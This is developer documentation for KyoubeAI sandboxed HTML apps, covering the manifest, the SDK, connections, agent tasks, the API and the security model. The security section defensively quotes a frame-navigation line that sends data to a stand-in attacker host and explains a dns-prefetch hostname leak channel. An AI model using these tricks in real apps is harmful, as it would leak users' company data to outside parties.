# Building KyoubeAI apps

An app is **one HTML document** (inline CSS and JavaScript, no external URLs — an injected
Content-Security-Policy blocks all network access and remote scripts, though `data:`/`blob:` images
and `data:` fonts still work since they never leave the document) plus a **manifest** that declares
which Data tables it uses. Users open apps at `/<company>/app-artifact/<slug>`. Apps run in a sandboxed iframe
with an opaque origin (no cookies, no storage, no host DOM); the only way to reach data is `window.kyoube`.

## Workflow

1. Design or reuse tables with the `kyoube-data` skill (list tables, create tables).
2. Create the app (`POST /apps`, or the `apps_create` tool where a gateway exists — see "The API" below) with a
   manifest and the full source. This makes **draft version 1**.
3. Test in the browser? You cannot — ask the user to open the app; or reason carefully and keep the UI simple.
4. Publish (`POST /apps/{slug}/publish`; needs schema access — with write access only, ask an admin to publish
   from the app page).
5. Iterate with an update (`POST /apps/{slug}`, a new draft version) → publish. A rollback restores an earlier version.

An app is only an app when it is stored this way: a server on its own port or a page hosted elsewhere is not
reachable from the Apps page and has no access to the company's data. The Kyoube Apps skill says so to
agents in as many words.

The gallery shows the **published** version's `name`, `icon` and `description`. Renaming an app in a
draft manifest changes nothing anyone sees until that version is published — and a rollback takes the
older name back with the version it restores. Everyone with read access sees the gallery, including
people who cannot see drafts at all, which is why a draft never writes to it.

An app that is in a user group is the exception: only that group's members, owners and admins see
it in the gallery or can open it ([groups.md](groups.md)).

## Manifest

```json
{ "name": "Sales CRM", "slug": "sales-crm", "icon": "📇", "description": "Contacts and deals",
  "tables": [ { "name": "contacts", "access": "readwrite" }, { "name": "deals", "access": "readwrite" } ] }
```
`access` is `read` (default) or `readwrite`. A call on an undeclared table is rejected. The viewer's own
level still applies: a `viewer` can never write, whatever the app declares.

An optional `decisions` key declares typed-decision sets; see [Typed decisions](#typed-decisions). An
optional `connections` key declares the outside services the app may call; see [Connections](#connections). An optional `tasks` key declares task templates for agents; see
[Tasks](#tasks).

## window.kyoube (injected before your code runs)

```ts
await kyoube.ready()                       // → { companyId, viewer: { id, name, level }, app: { slug, name, version }, tables, decisions: { available, sets }, connections: [{ name, access, available }], tasks: { available, templates } }
kyoube.data.query(table, { where?, orderBy?, limit?, offset?, fields? })   // → { rows, limit, offset }
kyoube.data.get(table, id)                 // → row | null
kyoube.data.count(table, where?)           // → { count }
kyoube.data.describe(table)                // → { fields: [{ name, kind, required, options }] }
kyoube.data.insert(table, rows)            // → created rows (validated by field kind)
kyoube.data.update(table, { ids } | { where }, patch)   // → { affected, rows }
kyoube.data.delete(table, { ids } | { where })          // → { affected }
kyoube.ui.toast(title, "info" | "success" | "warn" | "error")
kyoube.ui.openApp(slug)
kyoube.decide(set, { rowId } | { values })                 // → { decisionId, model, answers: { [q]: { type, value, confidence, status } } }
kyoube.decideOutcome(decisionId, question, value)          // → { outcome: "human_confirmed" | "human_changed" }
kyoube.connections.call(name, { method?, path?, query?, headers?, body? })   // → { status, headers, body }
kyoube.tasks.start(template, { rowId?, inputs? })          // → task; also get, list, cancel, open, watch (see Tasks)
```
`where` grammar: `{ field, op, value }` with `eq neq gt gte lt lte in contains starts_with is_null is_not_null`,
combined with `{ and: [...] }`, `{ or: [...] }`, `{ not: {...} }`. Errors are thrown as `kyoube.Error` with
`code` (`forbidden`, `invalid`, `not_found`, `conflict`, `limit`, `disabled`, `budget_exceeded`, `too_large`, `provider_rejected`, `provider_unavailable`, `timeout`; connection calls use `forbidden`, `invalid`, `disabled`, `too_large`, `timeout`, `provider_unavailable` and `limit`; task calls use `forbidden`, `invalid`, `not_found`, `disabled`, `limit` and `conflict`). Every row has `id`, `created_at`, `updated_at`.

`viewer.name` is always `""` in v1 — the host gives the worker ids, not display names — so greet the
viewer with `viewer.id` or with nothing at all, and never print `viewer.name` expecting a person's name.
`viewer.level` (`read`, `write`, `schema`) is the one worth branching on: hide the controls a viewer
cannot use.

## Typed decisions

An app can put closed questions to the company's typed-decision model (see [Typed decisions](decisions.md))
about a row or a form. The questions are declared in the manifest, so the person who publishes the app
sees exactly what will be sent.

```json
"decisions": {
  "triage": {
    "table": "tickets", "fields": ["subject", "body"],
    "questions": {
      "queue":   { "type": "choice", "instructions": "Which team owns this ticket?", "options": { "billing": null, "technical": null } },
      "urgency": { "type": "score", "instructions": "How soon does this need a reply?", "levels": ["This week", "Today", "Within the hour"] }
    }
  }
}
```

An app has at most 10 sets, and a set sends at most 20 fields of one table the manifest declares. The
questions follow the limits in [decisions.md](decisions.md): at most 20 per set, keys of lower-case
letters, digits and underscores, 2 to 254 options per choice and 2 to 10 levels per score.

**The two calls.**

- `kyoube.decide(set, { rowId })` reads the row under the viewer's own access and sends only the set's
  fields. If the viewer cannot read the row, the call fails.
- `kyoube.decide(set, { values })` is for a form the person has not saved. Each value is checked
  against its field's kind, and `values` may only name the set's fields.

In both cases the host builds the state; the app cannot add text of its own. The result is the
`decisionId`, the `model`, and one answer per question with its `value`, `confidence` and `status`
(`auto` or `review`). Compute dates, totals and comparisons in code; ask the model only the judgment.

**The review lane.** An answer with status `review` is a suggestion, not a result: show it to the person
and let them confirm or change it. `kyoube.decideOutcome(decisionId, question, value)` records what they
chose (`human_confirmed` when it matches the suggestion, otherwise `human_changed`). It only works for
this app's own decisions for the same viewer, within 24 hours, and once per question; a second call is a
`conflict`. The outcome is logged with `outcome_via: app`.

**Availability.** `ctx.decisions.available` from `kyoube.ready()` is false until the company has
switched Kyoube Apps on under Data access, Typed decisions, and a provider is configured. `ctx.decisions.sets`
lists the declared sets. An app should hide its decision controls when `available` is false; a call
made anyway fails with `disabled`.

**Limits.** Besides the 60 requests per 10 seconds each frame may make, a frame may make at most 10
decisions per 10 seconds; the eleventh fails with `limit`. The daily budget for the company applies as
well (`budget_exceeded`).

**Publishing.** A version that adds or changes decision sets must be published by a person, never by an
agent whatever its grant, and rolling back to such a version follows the same rule. Before publishing,
the Apps page shows what each set sends (table, fields and questions) and the person confirms it (the
REST body carries `decisionsConfirmed: true`; without it the publish fails with `invalid`). An agent
that has changed the sets saves the draft and asks the person to publish. Removing sets needs no
person, and publishing a version whose sets did not change needs no confirmation. A set that judges
anything about a person's employment, credit, housing, health, education or legal status must be
`"advisory": true`, so that every answer is a `review`. See [decisions.md](decisions.md#in-kyoube-apps)
for what leaves the server and what is logged.

## Connections

An app has no network, but it can call an outside service through a **connection**: a named base URL
and a stored key that a company admin set up (see [connections.md](connections.md)). The host makes
the call under the viewer's identity, adds the key on the server, and hands the response back. The key
never reaches the frame. Declare each connection in the manifest with the least access the app needs:

```json
"connections": [ { "name": "stripe", "access": "read" }, { "name": "crm", "access": "read-write" } ]
```

`access` is `read` (default, GET only) or `read-write`. At most 10 per app. A declaration narrows what
the connection allows and never widens it: declaring `read-write` on a connection that only allows
`read` fails at publish with `invalid`. A call on an undeclared connection is `forbidden`.

```ts
kyoube.connections.call(name, { method?, path?, query?, headers?, body? })
  // → { status, headers, body }      body is a string; parse JSON yourself
```

- `method` defaults to `GET`. `path` is relative to the connection's base URL (`customers`, not
  `/customers`) and `query` is an object of strings. The request rules, the header allow-lists and the
  response rules are in [connections.md](connections.md#the-request); in short, an absolute URL, `..`,
  `//` and a leading `/` are refused with `invalid`, the app may set only `accept`, `content-type`,
  `if-match`, `if-none-match`, `idempotency-key` and `x-request-id`, a body is at most 1 MiB, and a
  response is text of at most 2 MiB (`too_large` beyond that; binary is not supported).
- Every status is returned as is, so a 404 or 500 from the service is a normal answer: check
  `res.status`. Redirects are not followed. A 204 has an empty body.
- A call may take 25 seconds, then it fails with `timeout`.
- `kyoube.ready()` returns `connections: [{ name, access, available }]`. `available` is false when the
  connection is missing or its secret does not resolve; hide or explain the feature then.
- Errors are `kyoube.Error`: `forbidden` (not declared, or the declaration, the connection or the
  viewer's level does not allow the method), `invalid`, `disabled` (the connection is missing or its
  secret does not resolve; the host shows one toast per connection per mount), `too_large`, `timeout`,
  `provider_unavailable` (the service could not be reached) and `limit`.
- Who may call: the viewer must be able to open the app. A GET needs data level `read`; any other
  method needs `write`, a `read-write` declaration and a `read-write` connection. On core 2026.1005.0
  a member with the core `viewer` role cannot run apps at all (the core refuses their actions), so
  these rules apply in practice to members above viewer.
- Calls count in the frame's 60 per 10 seconds, with their own ceiling of **30 per 10 seconds**.
  Fetch once and keep the result; do not call per row. An app that keeps hitting a ceiling for three
  windows running is stopped.

A version that adds a connection or widens one needs a person to publish it. The publish dialog shows
each connection's host and base path, auth style, methods and the app's declared access, and marks
only the connections the version adds or widens; the REST body carries `connectionsConfirmed: true`,
and without it the publish fails with `invalid`. An agent cannot publish or roll back to such a
version. Removing or narrowing connections needs no confirmation, and every declared connection must
exist in the company's settings at publish.

### Example: a read-only API in a table

This app lists customers from a connection named `crm` (declared `read`, base URL
`https://api.example.com/v1/`), checks `available`, handles every outcome, and keeps the result.

```html
<!doctype html>
<html><head><meta charset="utf-8"><title>CRM customers</title>
<style>body{font:14px system-ui;margin:16px}table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #ddd;padding:6px;text-align:left}.scroll{overflow-x:auto}button{min-height:44px}#note{margin:12px 0}@media(prefers-color-scheme:dark){body{background:#111;color:#eee}td,th{border-color:#333}}</style>
</head><body>
<h1>CRM customers</h1>
<button id="reload">Reload</button>
<p id="note" role="status"></p>
<div class="scroll"><table><thead><tr><th>Name</th><th>Email</th><th>Plan</th></tr></thead><tbody id="rows"></tbody></table></div>
<script>
const note = document.getElementById("note");
const rowsEl = document.getElementById("rows");
function esc(s) { return String(s ?? "").replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c])); }
function say(text) { note.textContent = text; }

const MESSAGES = {
  forbidden: "You do not have access to the CRM from this app.",
  disabled: "The CRM is not set up. Ask a company admin.",
  too_large: "The CRM sent more than this app can show. Narrow the request.",
  timeout: "The CRM took too long to answer. Try again.",
  provider_unavailable: "The CRM could not be reached. Try again later.",
  limit: "Too many requests. Wait a few seconds.",
};

async function load() {
  say("Loading...");
  rowsEl.innerHTML = "";
  try {
    const res = await kyoube.connections.call("crm", { path: "customers", query: { limit: "50" } });
    if (res.status === 429) return say("The CRM is busy. Try again in " + (res.headers["retry-after"] || "a few") + " seconds.");
    if (res.status !== 200) return say("The CRM answered " + res.status + ".");
    let list;
    try { list = JSON.parse(res.body).customers; } catch { return say("The CRM sent something this app cannot read."); }
    if (!Array.isArray(list)) return say("The CRM sent something this app cannot read.");
    rowsEl.innerHTML = list.map(c => `<tr><td>${esc(c.name)}</td><td>${esc(c.email)}</td><td>${esc(c.plan)}</td></tr>`).join("");
    say(list.length + " customers");
  } catch (err) {
    say(MESSAGES[err.code] || err.message);
  }
}

document.getElementById("reload").addEventListener("click", load);
kyoube.ready().then((ctx) => {
  const crm = ctx.connections.find(c => c.name === "crm");
  if (!crm || !crm.available) return say(MESSAGES.disabled);
  return load();
});
</script>
</body></html>
```

The manifest for it is `{ "name": "CRM customers", "slug": "crm-customers", "tables": [], "connections": [ { "name": "crm", "access": "read" } ] }`.

## Tasks

An app can hand a piece of work to one of the company's agents and show the result. The manifest
declares named **templates** (the agent, the title and instructions, the table and fields, the inputs
the app may fill in, and the fields the agent writes); a person confirms them at publish. The app can
only pick a template and fill its declared inputs; it cannot write instructions or name an agent. The
full rules, limits and logging are in [app-tasks.md](app-tasks.md).

```json
"tasks": {
  "draft_reply": {
    "agent": "Support Bot",
    "title": "Draft a reply to ticket {{row.subject}}",
    "instructions": "Read the ticket and write a reply into its reply_draft field. Keep it under 150 words. Use a {{input.tone}} tone.",
    "table": "tickets",
    "fields": ["subject", "body", "reply_draft"],
    "inputs": { "tone": { "type": "choice", "options": ["friendly", "formal"] } },
    "writes": ["reply_draft"]
  }
}
```

At most 10 templates per app; `instructions` 1 to 4,000 characters; `fields` 1 to 20 fields that exist on
a declared `table`; at most 5 `inputs` (`choice`, `number` or `text`, all required when the task
starts); `writes` is a subset of `fields`. Only `{{row.<field>}}` and `{{input.<name>}}` placeholders
are allowed. Filled values land in the title and instructions flattened to one line, with braces
removed and cut to 200 characters, so put row placeholders in the middle of a sentence, not at the
start of a line. The agent also gets the values in a fenced data block (each cut to 2,000 characters,
the block to 16,000, `"_cut": true` when anything was cut), which it is told to read as data.

```ts
kyoube.tasks.start(template, { rowId?, inputs? })   // → the task
kyoube.tasks.get(id)                                // → task
kyoube.tasks.list({ template?, rowId? })            // → task[] (newest first, at most 50)
kyoube.tasks.cancel(id)                             // → task & { runMayContinue }
kyoube.tasks.open(id)                               // takes the person to the task page
kyoube.tasks.watch(id, (task) => …)                 // → stop()
// task: { id, template, rowId, status, waitingReason, startedBy, startedAt, updatedAt, result, url }
// status: "waiting" | "working" | "needs_review" | "blocked" | "done" | "cancelled"
```

- `kyoube.ready()` returns `tasks: { available, templates: [{ key, table, inputs, writes }] }`. Hide
  the button when `available` is false. It means the installation supports tasks and this version
  declares templates; it is not a per-viewer permission, so a start can still be refused.
- `watch` calls back with the task now and whenever it changes. The host checks every 5 seconds and
  stops at `done` or `cancelled`, after 30 minutes, when the app closes, or when the task can no longer
  be read (`not_found`, `forbidden` or `disabled`); passing failures are waited out. That last stop
  is silent, so keep showing the last status you saw. At most 10 watches per running app frame (one
  page showing the app). Call `stop()` when you no longer need one.
- `result` is the agent's latest reply for `done` and `needs_review`, plain text of at most 20,000
  characters, else `null`. **Show it with `textContent`, never `innerHTML`.** The agent wrote it.
- When the task is `done`, **re-read the data**: the agent wrote the rows with its own access.
- A paused agent is refused at `start` (`disabled`). If the core refuses to wake the agent once the
  task exists (over budget, paused a moment earlier), the task is cancelled and `start` fails with
  `disabled` and the reason. When the core only puts the wake-up off, the task stays `waiting` with a
  `waitingReason` and the core starts it later.
- `cancel` cannot stop a run already in progress. `runMayContinue: true` means the agent was working and
  its writes may still land; tell the person. If recording the cancel fails the app gets an error
  although the task is already cancelled, so re-read it with `get`.
- Errors are `kyoube.Error`: `forbidden` (the viewer can only read Data and the template writes, the
  agent cannot write Data, the core's assignment rule refuses this person that agent, or a cancel by
  someone who is neither the starter nor an admin), `invalid` (row or inputs), `not_found`,
  `disabled` (the agent no longer exists and a person must republish, the agent is paused, or the
  core refused to wake it and the task was cancelled; the message says which), `limit` (10 starts a
  minute per person per app, 25 open tasks per app, 5 `tasks.start` per 10 seconds) and `conflict`
  (cancelling a task that is already finished).
- Only people start or cancel tasks. On core 2026.1005.0 a member with the core `viewer` role cannot
  run apps at all.

A version that adds a template or changes any part of one needs a person to publish it
(`tasksConfirmed: true`; without it the publish fails with `invalid`), and so does one that would send
a template's work to a different agent than the current published version does (for example a
rollback to a version published for another agent). An agent cannot publish or roll back to such a
version. Removing a template needs no confirmation. The named agent needs Data write access for the
fields in `writes`: the publish dialog warns, and tasks are refused until an admin grants it.

### Example: a ticket list with a "Draft reply" button

The manifest is the `draft_reply` template above plus
`"tables": [ { "name": "tickets", "access": "readwrite" } ]` (the table has `subject`, `body` and
`reply_draft` text fields). The app lists tickets, starts the task for one, follows it, shows the reply
and reloads the row when the task is done. When the agent needs a person or is blocked, it offers the
task page and lets the person send the ticket again.

```html
<!doctype html>
<html><head><meta charset="utf-8"><title>Support tickets</title>
<style>body{font:14px system-ui;margin:16px}table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #ddd;padding:6px;text-align:left;vertical-align:top}.scroll{overflow-x:auto}button{min-height:44px}#note{margin:12px 0}.reply{white-space:pre-wrap;margin:4px 0}@media(prefers-color-scheme:dark){body{background:#111;color:#eee}td,th{border-color:#333}}</style>
</head><body>
<h1>Support tickets</h1>
<p id="note" role="status"></p>
<div class="scroll"><table><thead><tr><th>Subject</th><th>Reply</th><th></th></tr></thead><tbody id="rows"></tbody></table></div>
<script>
const note = document.getElementById("note");
const rowsEl = document.getElementById("rows");
const stops = new Map();                  // ticket id → stop() for its watch
const tasks = new Map();                  // ticket id → the last task seen for it
let canTask = false;

const MESSAGES = {
  forbidden: "You can't ask this agent to do that.",
  disabled: "The agent can't take this right now (it may be paused, over its budget or gone). Try again later, or ask a company admin.",
  limit: "Too many requests. Wait a minute.",
  invalid: "That ticket can't be sent.",
  not_found: "That ticket no longer exists.",
  conflict: "That task has already finished.",
};
function fail(err) { note.textContent = MESSAGES[err.code] || err.message; }

function rowEl(r) {
  const tr = document.createElement("tr");
  tr.dataset.id = r.id;
  const subject = document.createElement("td"); subject.textContent = r.subject ?? "";
  const reply = document.createElement("td");
  const text = document.createElement("div"); text.className = "reply"; text.textContent = r.reply_draft ?? "";
  const status = document.createElement("div"); status.className = "status";
  reply.append(text, status);
  const action = document.createElement("td");
  const button = document.createElement("button"); button.textContent = "Draft reply"; button.disabled = !canTask;
  button.addEventListener("click", () => draft(r.id, button));
  // The task page, once there is a task: where the person answers the agent or checks on it.
  const open = document.createElement("button"); open.className = "open"; open.textContent = "Open task"; open.hidden = !tasks.has(r.id);
  open.addEventListener("click", () => { const t = tasks.get(r.id); if (t) kyoube.tasks.open(t.id).catch(fail); });
  action.append(button, open);
  tr.append(subject, reply, action);
  return tr;
}
function rowFor(id) { return rowsEl.querySelector(`tr[data-id="${CSS.escape(id)}"]`); }

async function load() {
  const { rows } = await kyoube.data.query("tickets", { orderBy: [{ field: "created_at", direction: "desc" }], limit: 50 });
  rowsEl.replaceChildren(...rows.map(rowEl));
}

const LABELS = { waiting: "Waiting for the agent", working: "The agent is working", needs_review: "The agent needs a person", blocked: "The agent is blocked", done: "Done", cancelled: "Cancelled" };
// The last status seen stays on screen: a watch stops without a word after 30 minutes or when the
// task can no longer be read, so the line says when it was last updated and "Open task" shows the rest.
function show(id, task) {
  tasks.set(id, task);
  const row = rowFor(id);
  const el = row?.querySelector(".status");
  if (el) el.textContent = LABELS[task.status] + (task.waitingReason ? " (" + task.waitingReason + ")" : "") + " · updated " + new Date(task.updatedAt).toLocaleTimeString();
  const open = row?.querySelector(".open");
  if (open) open.hidden = false;
}

async function draft(ticketId, button) {
  button.disabled = true;
  try {
    const task = await kyoube.tasks.start("draft_reply", { rowId: ticketId, inputs: { tone: "friendly" } });
    show(ticketId, task);
    stops.get(ticketId)?.();
    stops.set(ticketId, kyoube.tasks.watch(task.id, async (t) => {
      show(ticketId, t);
      if (t.status === "done") {
        // The agent wrote the row with its own access: read it again, then show its reply as text.
        try {
          const fresh = await kyoube.data.get("tickets", ticketId);
          const old = rowFor(ticketId);
          if (fresh && old) old.replaceWith(rowEl(fresh));
          const status = rowFor(ticketId)?.querySelector(".status");
          if (status && t.result) status.textContent = "Agent's reply: " + t.result;   // textContent, never innerHTML
        } catch (err) { fail(err); }
      } else if (t.status === "cancelled" || t.status === "needs_review" || t.status === "blocked") {
        // The agent stopped short: the person can answer it on the task page, or send the ticket again.
        button.disabled = !canTask;
      }
    }));
  } catch (err) {
    button.disabled = !canTask;
    fail(err);
  }
}

kyoube.ready().then((ctx) => {
  canTask = ctx.tasks.available && ctx.tasks.templates.some((t) => t.key === "draft_reply");
  if (!canTask) note.textContent = "Drafting replies is not available in this app.";
  return load();
}).catch(fail);
</script>
</body></html>
```

## Rules for the source

- Start with `<!doctype html>`; put CSS in `<style>` and JS in `<script>` — no `src=`, `href=` to the network, no `fetch`.
- No `eval` and no `new Function`: the policy has no `'unsafe-eval'`, so both throw. Write real code, not
  code you build from strings (a templating helper that compiles a string is the usual way to trip on this).
- Use `kyoube.ready()` before the first data call; render loading and error states; keep lists paged (`limit` ≤ 200).
- Use semantic HTML and plain CSS; it must be readable on a 1024px-wide panel, on a 375px-wide phone, and in dark mode (`prefers-color-scheme`). On a phone: forms wrap (`flex-wrap: wrap`), wide tables scroll inside their own box (`overflow-x: auto`) or become one card per row, and every button and input is at least 44px tall.
- **Never navigate the frame.** Assigning `location`, following a link to another document, or submitting
  a form stops the app: the runner treats a second page load as the app navigating away, kills the bridge,
  and replaces the frame with a notice. Use `kyoube.ui.openApp(slug)` to go to another app, keep links
  in-page (`href="#…"`), and `preventDefault()` every form submit (`form-action 'none'` blocks the
  submission itself, but the attempt is still a navigation).
- **Stay inside the call budget.** One frame may make **60 requests per rolling 10 seconds**, of
  which at most **5 may be toasts**. Every call counts — a data call, a `ui.openApp`, and a call the
  host rejects as invalid all cost the same one — and over the ceiling a call comes back with
  `code: "limit"` (`limit: too many requests`), while a toast over the smaller ceiling is silently
  dropped. Keep hitting either ceiling for three windows running and the app is stopped with a
  notice. Batch instead of looping: one `query` with a `limit` beats sixty `get`s, and `insert` takes
  an array of rows. Connection calls have a smaller ceiling of **30 per 10 seconds**, counted inside
  the 60.
- No `<link rel="dns-prefetch">` or `<link rel="preconnect">`. They are the one network-shaped thing
  the policy does not govern (see the security model below), so treat them as forbidden rather than
  as a loophole; they cannot fetch anything for you in any case.
- Never store secrets or tokens in the app; never assume other companies' data exists.
- Keep the whole file under 2 MiB (usually well under 100 KB).

## Minimal example

```html
<!doctype html>
<html><head><meta charset="utf-8"><title>Contacts</title>
<style>body{font:14px system-ui;margin:16px}table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #ddd;padding:6px;text-align:left}form{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}input{flex:1 1 140px;min-width:0;min-height:44px}button{min-height:44px}.scroll{overflow-x:auto}@media(prefers-color-scheme:dark){body{background:#111;color:#eee}td,th{border-color:#333}}</style>
</head><body>
<h1>Contacts</h1>
<form id="f"><input name="name" placeholder="Name" required><input name="email" placeholder="Email"><button>Add</button></form>
<div class="scroll"><table><thead><tr><th>Name</th><th>Email</th><th></th></tr></thead><tbody id="rows"></tbody></table></div>
<script>
const rowsEl = document.getElementById("rows");
async function load() {
  const { rows } = await kyoube.data.query("contacts", { orderBy: [{ field: "created_at", direction: "desc" }], limit: 100 });
  rowsEl.innerHTML = rows.map(r => `<tr><td>${esc(r.name)}</td><td>${esc(r.email ?? "")}</td><td><button data-id="${r.id}">delete</button></td></tr>`).join("");
}
function esc(s) { return String(s).replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c])); }
document.getElementById("f").addEventListener("submit", async (e) => {
  e.preventDefault();
  const data = Object.fromEntries(new FormData(e.target));
  try { await kyoube.data.insert("contacts", [data]); e.target.reset(); await load(); kyoube.ui.toast("Added", "success"); }
  catch (err) { kyoube.ui.toast(err.message, "error"); }
});
rowsEl.addEventListener("click", async (e) => {
  const id = e.target.dataset.id;
  if (id) { await kyoube.data.delete("contacts", { ids: [id] }); await load(); }
});
kyoube.ready().then(load);
</script>
</body></html>
```

## The API

Agents and scripts reach apps through the plugin's REST routes: base URL
`$PAPERCLIP_API_URL/api/plugins/kyoube.apps/api`, header `Authorization: Bearer $PAPERCLIP_API_KEY`, and the
company as `?companyId=…` on `GET` or `"companyId"` in every `POST` body. Every agent run already carries
`PAPERCLIP_API_URL`, `PAPERCLIP_API_KEY` and `PAPERCLIP_COMPANY_ID`; a board API key works too.

| Operation | Method and path | POST body fields (besides `companyId`) |
|---|---|---|
| List apps | `GET /apps` | — |
| Read an app | `GET /apps/{slug}?version=latest` (or `current`, or a number) | — |
| Create (draft v1) | `POST /apps` | `manifest`, `source`, `notes?` |
| Update (new draft) | `POST /apps/{slug}` | `manifest`, `source`, `notes?` |
| Publish | `POST /apps/{slug}/publish` | `version?` (default: latest draft), `decisionsConfirmed?`, `connectionsConfirmed?`, `tasksConfirmed?` |
| Roll back | `POST /apps/{slug}/rollback` | `version` |
| Archive | `POST /apps/{slug}/archive` | — |

The same operations exist as `kyoube.apps:apps_*` tools, but the core (2026.831.1 through 2026.1005.0) only hands plugin tools
to a run through an MCP gateway, which it creates only for agents that already have an MCP connection
(`architecture.md`, "Agent run → Kyoube"); the skill therefore leads with the API.

## Security model

Apps run in an iframe with `sandbox="allow-scripts allow-forms allow-modals"` — no `allow-same-origin`,
and deliberately no `allow-popups` (apps navigate between each other through `ui.openApp`, not a popup)
— so they have an opaque origin: no cookies, no core API, no storage, and no access to the host
document.

Network access is blocked by an injected `<meta http-equiv="Content-Security-Policy">` tag, **not** by
the sandbox attribute — the sandbox isolates the origin; the policy is what actually stops the app
reaching a server. The runner always prepends its own `<head>` (that tag, then the `window.kyoube`
SDK) at the very top of the document — after a leading `<!doctype html>`, ahead of everything else —
so nothing the app ships can be parsed before the policy. Your own `<head>` still works: the parser
re-parents its children into the head already open, and a `<html>` tag after it keeps its attributes.
The exact policy is:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'
```

`default-src 'none'` and `connect-src 'none'` leave no way to `fetch`, open a `WebSocket`, or load any
remote resource — an app's only channel to the outside is the `postMessage` bridge described below. The
two `'unsafe-inline'` sources allow only the markup and script the app document itself ships (no remote
code can be loaded, and with no `'unsafe-eval'` in the policy, `eval` and `new Function` throw).
`img-src data: blob:` and `font-src data:` deliberately keep self-contained `data:`/`blob:` images and
`data:` fonts working, since they never leave the document. `form-action 'none'` and `base-uri 'none'`
close off form-submission and `<base>`-rewriting as navigation-shaped exfiltration channels — every
form submission is blocked, whatever its action, so a form handler must `preventDefault()` and do the
write through `kyoube.data.*` itself.

One thing the policy does **not** govern: `<link rel="dns-prefetch">` and `<link rel="preconnect">`.
Those ask the browser to resolve a hostname and open a socket rather than to fetch a resource, and no
CSP directive covers them (`prefetch-src` was removed from the spec and never shipped broadly). An app
that wanted to could therefore leak a small amount of information by encoding it into a hostname it
asks the browser to look up. It cannot read anything back — nothing is fetched, no response is
visible, and `connect-src 'none'` still blocks every actual request — so this is a low-bandwidth
one-way channel, not an exfiltration route for a table. Apps are told not to use either (see the
rules above), and the source of every version is stored and reviewable.

The only channel in or out of the frame is `postMessage` to the host page, which validates that the
message came from the exact iframe window it rendered, restricts accepted methods to the
`window.kyoube` surface (`data.*`, `ui.toast`, `ui.openApp`), and forwards data calls to the plugin
worker tagged with **the viewer's own identity** — never the app's. The worker re-authorises every call
against the viewer's access level and the app manifest's declared tables before touching the database:
a manifest can only narrow what the viewer could already do on the Data page, never widen it. `ui.toast`
shows a host toast; `ui.openApp(slug)` **navigates the host page** to another app (via the host's own
router) — it does not navigate the iframe, and the frame itself has no way to navigate the host (no
`allow-top-navigation`, no `allow-popups`).

A frame can still navigate *itself* — `location.href = "https://attacker.example/?…"` — and neither a
sandbox token nor a CSP directive stops that (the directives above govern fetch/XHR/WebSocket and
resource loads, not a script assigning `location`; blocking a *top* navigation of the host page is a
separate thing, which `allow-top-navigation`'s absence already does). Since a nested browsing context
keeps the same `WindowProxy` across such a navigation, the arriving document would otherwise inherit
the app's working bridge. So the runner counts loads and stops the app on the second one — the bridge
answers nothing further, the viewer's context is not re-announced, and the frame is replaced with
"This app navigated away and was stopped." That is why an app must never navigate its own frame; it
is not a restriction you can work around, only one you can trip over.

The load count is not an identification, though. The runner cannot tell *whose* document a `load`
belongs to, and the first one it sees is not necessarily the app's own: a document that assigns
`location` while it is still parsing never fires `load` at all, so the first load can already be the
arriving document's. That is why the bridge is not gated on the count. It is gated on a **handshake
nonce**. Every time the runner mounts an app it generates 16 random bytes and writes them into the
document immediately ahead of the SDK — inside the head it prepends, before any app-authored byte is
parsed. The SDK reads the value once, then removes both copies of it — it deletes the global *and*
removes the `<script>` element that carried it — so after the SDK installs, app code can reach the
nonce through neither `window` nor the DOM. It stamps the value on the handshake and on every request
it sends. The host acts only on messages carrying *that mount's* nonce; anything else is answered
with silence, and the third mismatch stops the app. Nor can app code read the nonce off the SDK's own
outgoing messages: the SDK binds `window.parent` at install, before any app byte is parsed, so
assigning over `window.parent` afterwards intercepts nothing. What an app in the frame holds
regardless is the context it asked for through its own `kyoube.ready()`, and the choice of URL it
navigates itself to — it needs no nonce for either.

The nonce is also what the viewer's context is released against. The host announces it **only** in
answer to a handshake carrying the mount's nonce — never on a frame load, which cannot say whose
document arrived — so a document that merely *arrives* by navigation, without the mount's nonce, is
told nothing about the company, the viewer or the app. (As above, an app that means to leak can send
the context it already holds to wherever it navigates; nothing on the host side stops an app
disclosing what it was given, and the destination learns nothing *further* from the frame.) The
SDK repeats its handshake every 250 ms (about twenty times) until the answer comes, so
`kyoube.ready()` still resolves as soon as the host is listening.

Each mount also has a **call budget**: 60 requests per rolling 10 seconds, of which at most 5 may be
toasts. Every request but the handshake counts, including one the host goes on to refuse as invalid
— over the ceiling a call comes back as `kyoube.Error` with `code: "limit"`, an over-quota toast is
dropped, and three consecutive limited windows stop the app with a notice. (A message that is not a
well-formed request for one of the SDK's methods, or that carries the wrong nonce, is dropped before
any of this: nothing is charged for it because nothing is done about it.) It is generous for anything a person drives
and small for a loop, which is the distinction it is drawn on.

`data_sql_select`'s read-only SQL validator also allowlists *functions*: a statement may call only
the documented set of pure scalar, aggregate and window builtins (`count`, `lower`, `date_trunc`,
`jsonb_build_object`, `row_number`, …). Every other name is rejected — no `pg_*` function is on the
list at all — as is a cast to any `reg*` OID alias type (`'pg_class'::regclass`), so neither the
catalog nor the filesystem nor a server setting is reachable from an app's queries.

A connection call crosses the same bridge and is the one way an app reaches the outside. The frame still
has no network: the host forwards the call to the plugin worker under the viewer's identity, the
worker checks the declaration, the connection's methods and the viewer's level, adds the key, and
returns the response with its headers filtered. The key is never sent to the frame, and the app
cannot change the host, the scheme or the base path, or set an auth or cookie header. What it can do
is send data the viewer can read to a service it declared, which is why a person confirms the
declared connections at publish. See [connections.md](connections.md) and
[SECURITY.md](../SECURITY.md#connections).

An app can therefore never do more than the person using it could do on the Data page.
